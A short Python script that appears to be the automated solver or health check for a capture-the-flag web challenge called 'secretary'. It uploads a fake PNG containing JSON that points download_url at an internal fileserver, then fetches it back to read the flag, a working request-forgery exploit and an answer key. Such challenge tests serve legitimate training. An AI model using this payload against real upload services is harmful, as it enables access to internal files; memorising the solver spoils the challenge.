import requests
import argparse
import yaml
import logging
from pathlib import Path

logger = logging.getLogger("secretary")

# Load the flag dynamically from the meta file
HERE = Path(__file__).parent
FLAG = yaml.safe_load(open(HERE / "meta.yml"))["flags"]


def test(url):
    session = requests.Session()
    session.get(f"{url}")
    session_cookie = session.cookies["session"]

    res = session.post(
        f"{url}/cloud/upload",
        headers={
            "Content-Type": "multipart/form-data; boundary=----WebKitFormBoundaryrl7TcU7tjSfBBAdt"
        },
        data=f'------WebKitFormBoundaryrl7TcU7tjSfBBAdt\r\nContent-Disposition: form-data; name="file"; filename="testfile.png"\r\nContent-Type: image/png\r\n\r\n{{\r\n  "download_url": "http://fileserver/flag.txt",\r\n  "id": "testid",\r\n  "name": "testfile.png",\r\n  "session": "{session_cookie}"\r\n}}\r\n------WebKitFormBoundaryrl7TcU7tjSfBBAdt--\r\n',
    )
    assert res.text == "ok", res.text

    res = session.get(f"{url}/cloud/list")
    uuid = res.json()[-1]["id"]
    res = session.get(f"{url}/cloud/fetch?file_id={uuid}&download=true")
    assert FLAG in res.text, res.text


if __name__ == "__main__":
    logging.basicConfig(level=logging.DEBUG)
    parser = argparse.ArgumentParser()
    parser.add_argument("url", default="http://localhost:5000", nargs="?")
    args = parser.parse_args()
    test(args.url)
